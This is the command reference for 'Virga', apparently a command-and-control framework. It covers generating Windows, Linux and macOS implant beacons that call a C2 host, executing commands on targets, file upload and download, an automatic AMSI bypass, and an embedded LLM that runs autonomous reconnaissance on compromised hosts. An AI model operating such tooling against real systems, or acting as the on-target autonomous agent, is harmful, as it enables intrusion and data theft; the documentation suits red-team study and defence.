---
url: /virga/reference/cli-command-reference.md
---
# CLI Command Reference

This document provides a detailed reference for all commands available in the Virga CLI.

## Command Line Options

### Execution Modes

* `--exec <command>` or `-e <command>`: Execute command and exit (non-interactive mode)
* `--session <id>`: Specify session ID for command execution
* `--version`: Show version information

### Output Control

* `--quiet`: Minimal output mode (sets log level to ERROR)
* `--no-color`: Disable color output

### Logging Options

* `--log-level <level>`: Set log level (debug, info, warn, error, off)
* `--debug`: Enable debug mode

### Connection Options

* `--config <file>`: Path to configuration file
* `--host <host>`: C2 server hostname or IP address
* `--port <port>`: C2 server port number

## Direct Command Execution

Virgasupports direct command execution without entering interactive mode, ideal for scripting and automation.

### Basic Usage

```bash
# Single command
./bin/virga-cli -e "help"

# Session-specific execution
./bin/virga-cli --session sess-123 --exec "shell ls -la"

# Quiet mode for scripts
./bin/virga-cli --quiet --exec "sessions list"
```

### Scripting Examples

```bash
#!/bin/bash
# Check for active sessions
SESSIONS=$(./bin/virga-cli --quiet --exec "sessions list")
if [ -n "$SESSIONS" ]; then
    echo "Active sessions found"
fi

# One-liner to get system info
./bin/virga-cli -e "use 1; sysinfo" | grep "OS:"
```

### Exit Codes

* `0`: Success
* `1`: Command execution error

### Environment Variables

* `VIRGA_CLI_LOG_LEVEL`: Set default log level
* `VIRGA_HOST`: Default server host
* `VIRGA_PORT`: Default server port

## Command Structure

Most commands follow a `verb <noun> [options]` structure. For example:

* `sessions list`: Lists all active sessions.
* `generate beacon --os windows`: Generates a beacon for the Windows operating system.

Many commands are contextual and only available when interacting with a session.

## Global Commands

These commands are always available from the main CLI prompt.

### `help`

Displays help information for commands.

* **Usage**: `help [command]`
* **Arguments**:
  * `command` (optional): The specific command to get help for. If omitted, it lists all available commands.

### `sessions`

Manages agent sessions.

* **Usage**: `sessions <subcommand> [args]`
* **Subcommands**:
  * `list`: Lists all active sessions, showing their ID, IP address, hostname, and last seen time.
  * `kill <id>`: Terminates the specified session.
    * `id` (required): The ID of the session to terminate.

### `interact`

Starts an interactive session with a specific agent.

* **Usage**: `interact <session_id>`
* **Arguments**:
  * `session_id` (required): The ID of the session to interact with. Once in an interactive session, the prompt will change, and session-specific commands become available.

### `listeners`

Manages C2 listeners.

* **Usage**: `listeners <subcommand> [args]`
* **Subcommands**:
  * `list`: Lists all currently active listeners and their status.
  * `add <name> <type> <bind_address> <port>`: Adds a new listener. (Note: This functionality may be limited depending on the server version).
  * `remove <name>`: Removes a listener. (Note: This functionality may be limited depending on the server version).

### `generate`

Generates various types of payloads.

* **Usage**: `generate <type> [options]`
* **Types**:
  * `beacon`: Generates a binary beacon (implant).

#### Beacon Generation Options

* `--config <path>`: Generate the beacon using a YAML configuration file (e.g., `configs/beacon.yaml`). This is the recommended method for complex configurations.
* `--os <os>`: Target OS (`windows`, `linux`, `darwin`).
* `--arch <arch>`: Target architecture (`amd64`, `arm64`).
* `--format <format>`: Output format (`exe`, `dll`, `elf`).
* `--http <host>`, `--https <host>`: Set the C2 host and protocol.
* `--port <port>`: Set the C2 port.
* `--sleep <seconds>`: Set the beacon's sleep time.
* `--jitter <percent>`: Set the beacon's sleep jitter.
* `--output <path>`: The path to save the generated payload.
* `--enable-llama`: Enables the embedded AI features.

**Example**:

```bash
# Generate a Windows beacon using a config file
virga> generate beacon --config configs/beacon.yaml

# Generate a Linux beacon with command-line flags
virga> generate beacon --os linux --arch amd64 --https c2.example.com --port 443 --output ./nimbus-linux
```

## Session-Specific Commands

These commands are available only when you are interacting with a session (i.e., after using the `interact` command).

### Command Execution

#### `exec`

Executes a single command on the target system and returns the output.

* **Usage**: `exec <command> [arguments...]`
* **Example**:
  ```bash
  virga (session)> exec whoami /all
  ```

#### `shell`

Starts a pseudo-interactive shell on the target system. This is useful for running multiple commands in sequence.

* **Usage**: `shell`
* **Embedded payloads**: After defining payloads in the beacon config you can invoke them with `shell >@payloadName <PowerShell command>`. Virga streams the embedded script plus your command into PowerShell and prepends the configured AMSI bypass automatically.
* **Note**: To exit the interactive shell, type `exit` or `quit`.

### File System Operations

#### `ls`

Lists files and directories in a specified path on the target system.

* **Usage**: `ls [path]`
* **Arguments**:
  * `path` (optional): The directory path to list. Defaults to the current working directory of the beacon.

#### `pwd`

Prints the current working directory of the beacon on the target system.

* **Usage**: `pwd`

#### `cd`

Changes the current working directory of the beacon on the target system.

* **Usage**: `cd <path>`
* **Arguments**:
  * `path` (required): The directory to change to.

#### `upload`

Uploads a file from your local machine to the target system.

* **Usage**: `upload <local_path> <remote_path>`
* **Arguments**:
  * `local_path` (required): The path of the file on your local machine.
  * `remote_path` (required): The destination path on the target system.

#### `download`

Downloads a file from the target system to your local machine.

* **Usage**: `download <remote_path> <local_path>`
* **Arguments**:
  * `remote_path` (required): The path of the file on the target system.
  * `local_path` (required): The destination path on your local machine.

### Information Gathering

#### `info`

Displays a summary of information about the current session, including network details, system properties, and beacon configuration.

* **Usage**: `info`

### AI & LLM Operations

These commands require an AI-enabled beacon.

#### `llama`

Interacts with the embedded LLM model on the target.

* **Usage**: `llama <subcommand> [options]`
* **Subcommands**:
  * `prompt <text>`: Sends a task to the AI. The task runs in the background.
  * `result <task_id>`: Retrieves the result of a completed AI task.
  * `status`: Checks the current status of the AI engine.
  * `cancel`: Cancels the currently running AI task.
  * `auto`: Starts the pre-configured autonomous mode.

**Example**:

```bash
# Start an AI task
virga (session)> llama prompt "Find all running processes not signed by Microsoft"

# Check the result later
virga (session)> llama result <task_id_from_previous_command>
```

#### `memdb`

Queries the beacon's in-memory database where the AI stores its findings and command execution history.

* **Usage**: `memdb <query|command>`

##### Tables Available

* `commands`: Shell command execution history
* `llama`: LLM interactions and autonomous tasks
* `tasks`: Pending tasks in queue
* `sysinfo`: System information snapshots

##### Basic Commands

* `memdb help`: Show comprehensive help with all query options
* `memdb stats`: Show database statistics (record counts)
* `memdb commands [limit]`: Show recent commands (default: 10)
* `memdb llama [limit]`: Show recent LLM interactions (default: 5)
* `memdb tasks`: Show pending tasks
* `memdb sysinfo [hours]`: Show system info history (default: 1 hour)
* `memdb clear [hours]`: Clear data older than X hours (default: 24)
* `memdb get <type> <id>`: Get specific record by ID with FULL content

##### SQL-Style Queries

MemDB supports a subset of SQL for advanced querying:

**Basic SELECT queries:**

* `memdb SELECT * FROM commands LIMIT 10`
* `memdb SELECT * FROM llama ORDER BY timestamp DESC LIMIT 10`
* `memdb SELECT COUNT(*) FROM commands`

**Filtering commands:**

* `memdb SELECT * FROM commands WHERE module='llama' LIMIT 5`
* `memdb SELECT * FROM commands WHERE module='shell' LIMIT 5`
* `memdb SELECT * FROM commands WHERE exit_code != 0 LIMIT 5`

**Filtering LLM interactions:**

* `memdb SELECT * FROM llama WHERE status='success' LIMIT 10`
* `memdb SELECT * FROM llama WHERE status='failure' LIMIT 10`
* `memdb SELECT * FROM llama WHERE task_type='llama_autonomous'`
* `memdb SELECT * FROM llama WHERE task_type='llama'`
* `memdb SELECT * FROM llama WHERE temperature > 0.5`
* `memdb SELECT * FROM llama WHERE commands_issued > 0`
* `memdb SELECT * FROM llama WHERE timestamp > '2h'` (last 2 hours)
* `memdb SELECT * FROM llama WHERE timestamp < '24h'` (older than 24 hours)

##### Viewing Full LLM Responses

The `llama` command shows truncated responses for readability. To view the COMPLETE response and command details:

1. First list interactions: `memdb llama 10`
2. Note the Task ID from the output
3. Get full details: `memdb get llama <task_id>`

**Example:**

```
memdb llama 5                    # List last 5 Llama interactions (truncated)
memdb get llama auto_system_reconnaissance_123456  # View FULL response
```

##### Advanced Examples

**Find failed commands:**

```
memdb SELECT * FROM commands WHERE exit_code != 0 LIMIT 20
```

**Find LLM interactions that generated commands:**

```
memdb SELECT * FROM llama WHERE commands_issued > 0 ORDER BY timestamp DESC LIMIT 10
```

**Find recent autonomous tasks:**

```
memdb SELECT * FROM llama WHERE task_type='llama_autonomous' AND timestamp > '6h'
```

**Count total LLM interactions:**

```
memdb SELECT COUNT(*) FROM llama
```

**Monitor command execution by module:**

```
memdb SELECT * FROM commands WHERE module='llama' LIMIT 10
memdb SELECT * FROM commands WHERE module='shell' LIMIT 10
```

##### Output Format

* List views show truncated content for readability
* Response text is limited to 5 lines in list view
* Commands are limited to first 3 in list view
* Use `get` command to view complete untruncated content
* Command execution results (exit codes, errors, output) are shown when available

### Beacon Management

#### `beacons`

Manages the configuration of the currently active beacon.

* **Usage**: `beacons <subcommand> [args]`
* **Subcommands**:
  * `list`: Shows the current beacon configuration (sleep, jitter, etc.).
  * `set-sleep <seconds>`: Changes the beacon's sleep time.
  * `set-jitter <percent>`: Changes the beacon's jitter percentage.
